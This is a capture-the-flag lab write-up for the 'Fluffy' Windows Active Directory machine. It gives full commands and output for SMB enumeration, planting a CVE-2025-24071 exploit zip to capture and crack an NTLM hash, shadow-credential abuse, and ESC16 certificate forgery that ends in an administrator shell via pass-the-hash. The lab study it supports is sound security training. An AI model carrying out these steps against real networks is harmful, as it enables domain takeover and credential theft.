## Fluffy

### Lab Details 

- Difficulty: Easy
- Type: CA Misconfiguration, Active Directory, Windows

#### Enumeration
- run nmap
```bash
$ cat Fluffy.nmap                  
$ nmap 10.129.232.88 -p- -T4 --min-rate 1000 -sC -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-28 10:08 CDT
Nmap scan report for 10.129.232.88
Host is up (0.069s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-28 22:11:13Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-28T22:12:46+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-28T22:12:46+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-28T22:12:46+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-28T22:12:46+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49742/tcp open  msrpc         Microsoft Windows RPC

```

#### Initial Foothold 
- with the credential given perform SMB enumeration, `j.fleischman` can read and write to the `IT` share
```bash
$ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share 
```
- get all remote files from `IT` Share
- we see a `pdf` file named `Upgrade_Notice.pdf` which lists vulnerabilities that exists on the target
- searching through the vulnerabilities found [POC for CVE-2025-24071](https://github.com/0x6rss/CVE-2025-24071_PoC)
- get the POC and we can generate a zip file and write it to the `IT`  share and wait for user to extract
```bash
smb: \> put ./exploit.zip 
putting file ./exploit.zip as \exploit.zip (52.6 kb/s) (average 52.6 kb/s)
smb: \> ls
  .                                   D        0  Sun Sep 28 18:29:47 2025
  ..                                  D        0  Sun Sep 28 18:29:47 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 10:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 10:04:05 2025
  exploit.zip                         A      323  Sun Sep 28 18:29:47 2025
  KeePass-2.58                        D        0  Fri Apr 18 10:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 10:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 09:31:07 2025

		5842943 blocks of size 4096. 1958316 blocks available
```
- run `responder` and we can get the `NTLM` hash
```bash
$ sudo responder -I tun0 -v
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:d5fa427379be78da:667FC1387C8A148E4482963E53194A26:010100000000000000612A1E6B30DC01D8A1B60064557C840000000002000800440036005300480001001E00570049004E002D0059004700300051004A0055004600380049005200390004003400570049004E002D0059004700300051004A005500460038004900520039002E0044003600530048002E004C004F00430041004C000300140044003600530048002E004C004F00430041004C000500140044003600530048002E004C004F00430041004C000700080000612A1E6B30DC01060004000200000008003000300000000000000001000000002000006E8764DB4B2E1B46F4510504D6A75E828715DD6F682331AB0BC3D02DEFC009C40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370038000000000000000000
```
- we can crack it using `hashcat`
```bash
$ hashcat -m 5600 p.agila /usr/share/wordlists/rockyou.txt
<snip>
P.AGILA::FLUFFY:d5fa427379be78da:667fc1387c8a148e4482963e53194a26:010100000000000000612a1e6b30dc01d8a1b60064557c840000000002000800440036005300480001001e00570049004e002d0059004700300051004a0055004600380049005200390004003400570049004e002d0059004700300051004a005500460038004900520039002e0044003600530048002e004c004f00430041004c000300140044003600530048002e004c004f00430041004c000500140044003600530048002e004c004f00430041004c000700080000612a1e6b30dc01060004000200000008003000300000000000000001000000002000006e8764db4b2e1b46f4510504d6a75e828715dd6f682331ab0bc3d02defc009c40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370038000000000000000000:prometheusx-303
```
#### Lateral Movement (If any)
- run `bloodhound` against the target
```bash
$ bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.129.232.88 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 00S
```
- load the `json` files to bloodhound
![[AD/Easy/Fluffy/bloodhound.png]]
- according to the output from bloodhound we can see that `p.agila` has `Generic Write` over `LDAP_SVC`, `WINRM_SVC` and `CA_SVC` through `Service Accounts` Group
- which means we can add shadow credentials to these accounts as `p.agila` using `bloodyAD`
- but first we need to add `p.agila` to the `Service Accounts` group
```bash
$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```
- then add shadow credential to `WINRM_SVC` and `CA_SVC`
```bash
$ certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.129.81.120
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5ecce8cd-1ef7-0b61-9df6-8cb61cc8dfb3'
[*] Adding Key Credential with device ID '5ecce8cd-1ef7-0b61-9df6-8cb61cc8dfb3' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '5ecce8cd-1ef7-0b61-9df6-8cb61cc8dfb3' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

$ certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc -dc-ip 10.129.81.120
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0905ff79-0f59-d7ef-c006-0fc1a06a3346'
[*] Adding Key Credential with device ID '0905ff79-0f59-d7ef-c006-0fc1a06a3346' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '0905ff79-0f59-d7ef-c006-0fc1a06a3346' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```
#### Privilege Escalation
- check whether if `CA` is running on target using `nxc`
```bash
$ nxc ldap 10.129.81.120 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
LDAP        10.129.81.120   389    10.129.81.120    [-] Error retrieving os arch of 10.129.81.120: Could not connect: timed out
SMB         10.129.81.120   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
LDAP        10.129.81.120   389    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767 
ADCS        10.129.81.120   389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.81.120   389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        10.129.81.120   389    DC01             Found CN: fluffy-DC01-CA
```
- attempt to find vulnerabilities in `CA` config 
```bash
certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69
-vulnerable -enabled -stdout
<SNIP>
 [!] Vulnerabilities
 ESC16 : Security Extension is disabled.
 [*] Remarks
 ESC16 : Other prerequisites may be required for this to
be exploitable. See the wiki for more details.
Certificate Templates : [!] Could not find any certificate templates
```
- to exploit this, we first need to update the UPN (User Principal Name) of the `ca_svc` user to administrator
```bash
$ certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
- then, a certificate should be requested as the admin user since we have update `ca_svc` to admin
```bash
$ certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.81.120' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```
- update `ca_svc` back to itself
```bash
$  certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
- use the `administrator.pfx` certificate to get the `RC4` hash of the Administrator user
```bash
$ certipy auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.81.120
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
- get reverse shell access as admin via `evil-winrm`
```bash
$ evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### Resources

#### Lesson Learned
